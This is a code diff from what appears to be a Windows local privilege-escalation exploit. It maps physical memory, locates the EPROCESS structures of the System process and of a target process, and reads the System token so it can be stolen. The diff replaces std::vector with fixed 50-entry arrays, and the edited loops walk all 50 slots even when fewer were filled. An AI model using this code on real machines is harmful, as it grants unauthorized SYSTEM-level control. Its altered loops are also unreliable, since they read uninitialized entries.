@@ -70,18 +70,19 @@ int main(int argc, char** argv)
 	if (buf == 0) {
 		exit(EXIT_FAILURE);
 	}
-	
-	std::vector <unsigned __int64> EPROCESS_SYSTEM;
+	const int EPROCESS_SYSTEM_size = 50;
+	unsigned __int64 EPROCESS_SYSTEM[EPROCESS_SYSTEM_size]; // 50 should be enough
+
 
 	// do some sanity checks with GetEPROCESSPhysicalBase() as there may be some false positives...
-	if (GetEPROCESSPhysicalBase("System", 4, hPhysicalMemory, EPROCESS_SYSTEM) == -1)
+	if (GetEPROCESSPhysicalBase("System", 4, hPhysicalMemory, EPROCESS_SYSTEM, EPROCESS_SYSTEM_size) == -1)
 	{
 		fprintf(stderr, "[!] GetEPROCESSPhysicalBase failed\n");
 	}
 
 	unsigned __int64 systemToken = 0;
 
-	for (int i = 0; i < EPROCESS_SYSTEM.size(); i++) {
+	for (int i = 0; i < EPROCESS_SYSTEM_size; i++) {
 		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, (EPROCESS_SYSTEM[i] & ~((unsigned __int64)-1 & 0xFFF)), 0x4000, buf) == FALSE) {
 			fprintf(stderr, "[!] MapPhysicalMemory failed\n");
 			return -1;
@@ -101,15 +102,16 @@ int main(int argc, char** argv)
 
 	printf("----------------------------------------------- now for %s\n", targetProcess);
 
-	std::vector <unsigned __int64> EPROCESS_cmd;
+	const int EPROCESS_cmd_size = 50;
+	unsigned __int64 EPROCESS_cmd[EPROCESS_cmd_size];
 
-	if (GetEPROCESSPhysicalBase(targetProcess, GetCurrentProcessId(), hPhysicalMemory, EPROCESS_cmd) == -1)
+	if (GetEPROCESSPhysicalBase(targetProcess, GetCurrentProcessId(), hPhysicalMemory, EPROCESS_cmd, EPROCESS_cmd_size) == -1)
 	{
 		fprintf(stderr, "[!] GetEPROCESSPhysicalBase failed\n");
 	}
 
 
-	for (size_t i = 0; i < EPROCESS_cmd.size(); i++) {
+	for (size_t i = 0; i < EPROCESS_cmd_size; i++) {
 		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, (EPROCESS_cmd[i] & ~((unsigned __int64)-1 & 0xFFF)), 0x4000, buf) == FALSE) {
 			fprintf(stderr, "[!] MapPhysicalMemory failed\n");
 			return -1;
